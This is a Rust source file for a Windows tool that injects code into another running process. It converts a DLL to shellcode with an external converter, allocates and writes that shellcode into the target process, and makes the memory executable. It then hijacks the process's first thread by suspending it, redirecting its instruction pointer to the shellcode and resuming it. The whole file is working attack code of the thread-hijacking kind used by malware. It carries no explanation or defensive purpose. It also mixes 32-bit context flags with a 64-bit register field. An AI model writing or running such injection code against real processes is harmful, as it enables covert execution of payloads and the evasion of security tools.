use std::{
    error::Error,
    fs::File,
    mem::MaybeUninit,
    os::raw::c_void,
    path::{Path, PathBuf},
    process::Command,
    ptr::null_mut,
    str::FromStr,
};

use anyhow::{anyhow, ensure, Context};
use clap::Parser;
use windows::Win32::{
    Foundation::{CloseHandle, GetLastError, ERROR_INSUFFICIENT_BUFFER, HANDLE, MAX_PATH},
    Storage::FileSystem::GetTempFileNameA,
    System::{
        Diagnostics::{
            Debug::{
                GetThreadContext, InitializeContext, SetThreadContext, WriteProcessMemory, CONTEXT,
                CONTEXT_CONTROL_X86, CONTEXT_FLAGS, CONTEXT_FULL_X86,
            },
            ToolHelp::{
                CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD,
                THREADENTRY32,
            },
        },
        Memory::{
            VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, PAGE_EXECUTE, PAGE_PROTECTION_FLAGS,
            PAGE_READWRITE,
        },
        Threading::{
            OpenProcess, OpenThread, ResumeThread, SuspendThread, PROCESS_VM_OPERATION,
            PROCESS_VM_WRITE, THREAD_GET_CONTEXT, THREAD_SET_CONTEXT, THREAD_SUSPEND_RESUME,
        },
    },
};

struct HandleGuard(HANDLE);
impl Drop for HandleGuard {
    fn drop(&mut self) {
        let _ = unsafe { CloseHandle(self.0) };
    }
}

#[derive(Debug, Parser)]
struct Cli {
    pid: u32,
    dll_path: PathBuf,
    dll_to_shellcode_path: Option<PathBuf>,
}

const DEFAULT_DLL_TO_SHELLCODE_PATH: &str = "C:/users/sho/Documents/DllToShellCode.exe";

fn main() -> anyhow::Result<()> {
    let cli = Cli::parse();
    let dll_to_shellcode_path = cli
        .dll_to_shellcode_path
        .unwrap_or_else(|| DEFAULT_DLL_TO_SHELLCODE_PATH.into());
    let shellcode = dll_to_shellcode(&cli.dll_path, &dll_to_shellcode_path)
        .context("failed to convert dll to shellcode")?;
    run_remote_shellcode(cli.pid, &shellcode).context("failed to run shellcode")?;
    println!("DEBUG:back in ain");
    Ok(())
}

fn dll_to_shellcode(dll_path: &Path, dll_to_shellcode_path: &Path) -> anyhow::Result<Vec<u8>> {
    let shellcode_path = dll_path.with_extension("shellcode");
    let exit_status = Command::new(dll_to_shellcode_path)
        .args(["d", "0", "0", "0"])
        .arg(dll_path)
        .arg(&shellcode_path)
        .spawn()
        .context("failed to spawn dll to shellcode command")?
        .wait()
        .context("failed to wait for dll to shellcode command")?;
    ensure!(
        exit_status.success(),
        "dll to shellcode command failed with exit code {:?}",
        exit_status.code()
    );
    std::fs::read(&shellcode_path).context("failed to read dll to shellcode output file")
}

fn run_remote_shellcode(pid: u32, shellcode: &[u8]) -> anyhow::Result<()> {
    let tid = find_first_thread_of_process(pid).context("failed to find thread of process")?;
    println!("[*] injecting to thread with TID {}", tid);
    let shellcode_addr = allocate_shellcode_in_remote_process(pid, shellcode)?;
    run_shellcode_in_remote_thread(tid, shellcode_addr)?;
    println!("DEBUG: done2");
    Ok(())
}

fn get_context_size(flags: CONTEXT_FLAGS) -> anyhow::Result<usize> {
    let mut ctx_buf_size = 0;
    let err = unsafe {
        InitializeContext(None, flags, null_mut(), &mut ctx_buf_size)
            .err()
            .context("the context initialization unexpectedly succeeded with an empty buffer")?
    };

    if unsafe { GetLastError() } != ERROR_INSUFFICIENT_BUFFER {
        return Err(err)
            .context("the context initialization function failed with an unknown error");
    }
    Ok(ctx_buf_size as usize)
}

fn initialize_context(flags: CONTEXT_FLAGS) -> anyhow::Result<(Vec<u8>, *mut CONTEXT)> {
    let ctx_size = get_context_size(flags)?;
    let mut ctx_buf = vec![0u8; ctx_size];
    let mut ctx_ptr = null_mut();
    let mut ctx_length = ctx_buf.len() as u32;
    unsafe {
        InitializeContext(
            Some(ctx_buf.as_mut_ptr().cast()),
            flags,
            &mut ctx_ptr,
            &mut ctx_length,
        )
        .context("failed to initialize context")?;
    };
    let ctx_buf_ptr_range = ctx_buf.as_ptr()..unsafe { ctx_buf.as_ptr().add(ctx_size) };
    assert!(ctx_buf_ptr_range.contains(&ctx_ptr.cast::<u8>().cast_const()));
    Ok((ctx_buf, ctx_ptr))
}

fn run_shellcode_in_remote_thread(tid: u32, shellcode_addr: *mut c_void) -> anyhow::Result<()> {
    let thread_handle = HandleGuard(unsafe {
        OpenThread(
            THREAD_SET_CONTEXT | THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME,
            false,
            tid,
        )
        .context("failed to open thread")?
    });
    println!("[*] suspending thread");
    let res = unsafe { SuspendThread(thread_handle.0) };
    if res == u32::MAX {
        return Err(windows::core::Error::from_win32()).context("failed to suspend thread");
    }

    let (_orig_ctx_buf, orig_ctx_ptr) = initialize_context(CONTEXT_FULL_X86)?;
    let orig_ctx = unsafe { &mut *orig_ctx_ptr };
    orig_ctx.ContextFlags = CONTEXT_FULL_X86;
    unsafe { GetThreadContext(thread_handle.0, orig_ctx).context("failed to get thread context")? };

    let (_shellcode_ctx_buf, shellcode_ctx_ptr) = initialize_context(CONTEXT_FULL_X86)?;
    let shellcode_ctx = unsafe { &mut *shellcode_ctx_ptr };
    *shellcode_ctx = *orig_ctx;
    shellcode_ctx.ContextFlags = CONTEXT_FULL_X86;
    shellcode_ctx.Rip = shellcode_addr as u64;
    println!("[*] setting rip to 0x{:x}", shellcode_addr as u64);
    unsafe {
        SetThreadContext(thread_handle.0, shellcode_ctx).context("failed to set thread context")?
    };

    println!("[*] resuming thread");
    let res = unsafe { ResumeThread(thread_handle.0) };
    if res == u32::MAX {
        return Err(windows::core::Error::from_win32()).context("failed to resume thread");
    }
    println!("DEBUG: done running shellcode");
    Ok(())
}

fn allocate_shellcode_in_remote_process(pid: u32, shellcode: &[u8]) -> anyhow::Result<*mut c_void> {
    let proc_handle = HandleGuard(unsafe {
        OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, false, pid)
            .context("failed to open process")
    }?);

    let allocated_addr = unsafe {
        VirtualAllocEx(
            proc_handle.0,
            None,
            shellcode.len(),
            MEM_COMMIT,
            PAGE_READWRITE,
        )
    };
    ensure!(
        !allocated_addr.is_null(),
        "failed to allocate memory in the remote process"
    );

    let mut num_of_bytes_written = 0;
    unsafe {
        WriteProcessMemory(
            proc_handle.0,
            allocated_addr,
            shellcode.as_ptr().cast(),
            shellcode.len(),
            Some(&mut num_of_bytes_written),
        )
        .context("failed to write shellcode to remote process")?
    };
    ensure!(
        num_of_bytes_written == shellcode.len(),
        "not all shellcode bytes were copied"
    );

    let mut old_prot = PAGE_PROTECTION_FLAGS(0);
    unsafe {
        VirtualProtectEx(
            proc_handle.0,
            allocated_addr,
            shellcode.len(),
            PAGE_EXECUTE,
            &mut old_prot,
        )
        .context("failed to make shellcode memory executable in the remote process")?
    };
    Ok(allocated_addr)
}

fn find_first_thread_of_process(pid: u32) -> anyhow::Result<u32> {
    let snapshot = HandleGuard(unsafe {
        CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
            .context("failed to create threads snapshot")?
    });
    let mut thread: THREADENTRY32 = unsafe { core::mem::zeroed() };
    thread.dwSize = core::mem::size_of::<THREADENTRY32>() as u32;
    unsafe {
        Thread32First(snapshot.0, &mut thread)
            .context("failed to get first thread in threads snapshot")?
    };
    loop {
        if thread.th32OwnerProcessID == pid {
            return Ok(thread.th32ThreadID);
        }
        if unsafe { Thread32Next(snapshot.0, &mut thread).is_err() } {
            break;
        }
    }
    Err(anyhow!("no threads belong to pid {}", pid))
}
